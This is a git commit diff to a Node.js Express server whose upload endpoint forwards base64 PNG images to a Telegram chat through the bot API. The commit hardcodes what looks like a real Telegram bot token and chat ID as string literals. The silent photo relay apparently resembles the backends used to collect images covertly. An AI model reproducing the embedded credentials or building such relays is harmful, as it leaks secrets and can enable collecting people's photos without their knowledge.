446034694630d625700a18a6b75a2e2d2afb3267
hikmetbabayevv <126342250+hikmetbabayevv@users.noreply.github.com>
2025-09-04 16:35:43 -0700

    Update server.js

--- server.js
+++ server.js
@@ -1,13 +1,13 @@
 import express from "express";
 import fetch from "node-fetch";
-import FormData from "form-data";
 
 const app = express();
 app.use(express.json({ limit: "10mb" }));
 
-const TELEGRAM_TOKEN = process.env.8441020275:AAFbmi0gosxpm3Oo1uHa4tyoR7WkacUFhFw;
-const CHAT_ID = process.env.1227787506;
+const TELEGRAM_TOKEN = "8441020275:AAFbmi0gosxpm3Oo1uHa4tyoR7WkacUFhFw";
+const CHAT_ID = "1227787506";
 
+// Foto göndərmə endpointi
 app.post("/upload", async (req, res) => {
   const photo = req.body.image;
   const base64Data = photo.replace(/^data:image\/png;base64,/, "");
@@ -15,7 +15,7 @@ app.post("/upload", async (req, res) => {
 
   const formData = new FormData();
   formData.append("chat_id", CHAT_ID);
-  formData.append("photo", buffer, { filename: "foto.png" });
+  formData.append("photo", new Blob([buffer]), "foto.png");
 
   await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendPhoto`, {
     method: "POST",
@@ -25,4 +25,4 @@ app.post("/upload", async (req, res) => {
   res.send("ok");
 });
 
-app.listen(process.env.PORT || 3000, () => console.log("Server başladı ✅"));
+app.listen(3000, () => console.log("Server başladı ✅"));
